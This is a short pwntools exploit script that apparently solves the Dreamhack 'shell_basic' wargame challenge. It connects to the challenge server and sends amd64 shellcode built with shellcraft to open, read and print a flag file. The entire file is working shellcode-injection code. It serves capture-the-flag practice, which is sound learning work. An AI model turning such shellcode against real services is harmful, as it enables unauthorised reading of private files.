from pwn import *

p = remote("host3.dreamhack.games", 15163)

context.arch = "amd64"
r = "/home/shell_basic/flag_name_is_loooooong"

shellcode = ''
shellcode += shellcraft.open(r)
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

print(p.recv())
p.sendline(asm(shellcode))
print(p.recv())
